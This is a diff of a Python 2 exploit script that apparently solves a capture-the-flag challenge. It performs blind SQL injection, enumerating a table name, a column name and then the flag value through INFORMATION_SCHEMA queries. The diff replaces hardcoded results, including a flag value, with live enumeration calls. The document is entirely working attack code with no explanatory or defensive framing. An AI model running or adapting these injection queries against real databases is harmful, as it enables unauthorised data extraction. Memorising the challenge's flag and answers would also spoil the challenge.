@@ -40,27 +40,21 @@ def getLength(query,minlen=0,maxlen=256):
 			minlen = target
 	return minlen
 
-#p=getLength("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%%flag' AND LENGTH(TABLE_NAME) BETWEEN %d AND %d)")
-tlen=16
+tlen=getLength("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%%flag' AND LENGTH(TABLE_NAME) BETWEEN %d AND %d)")
 print 'len(table_name) =',tlen
 
-#r=enumString("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%%flag' AND %s)","TABLE_NAME",tlen)
-t='the_elusive_flag'
+t=enumString("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE COLUMN_NAME LIKE '%%flag' AND %s)","TABLE_NAME",tlen)
 print 'table_name =',t
 
-#p=getLength("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='the_elusive_flag' AND LENGTH(COLUMN_NAME) BETWEEN %d AND %d)")
-clen=24
+clen=getLength("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='the_elusive_flag' AND LENGTH(COLUMN_NAME) BETWEEN %d AND %d)")
 print 'len(%s.column_name) = %d'%(t,clen)
 
 
-#r=enumString("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='the_elusive_flag' AND %s)","COLUMN_NAME",clen)
-c='this_column_has_the_flag'
+c=enumString("(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='the_elusive_flag' AND %s)","COLUMN_NAME",clen)
 print '%s.column_name = %s'%(t,c)
 
-#p=getLength("(SELECT LENGTH(this_column_has_the_flag) BETWEEN %d and %d FROM the_elusive_flag")
-dlen=256
+dlen=getLength("(SELECT LENGTH(this_column_has_the_flag) BETWEEN %d and %d FROM the_elusive_flag")
 print 'len(%s.%s[0]) = %d'%(t,c,dlen)
 
-#r=enumString("(SELECT %s FROM the_elusive_flag)","this_column_has_the_flag",dlen)
-r='9d4dcc5981b17bf37740c7dbabe3b294'
+r=enumString("(SELECT %s FROM the_elusive_flag)","this_column_has_the_flag",dlen)
 print 'flag',r
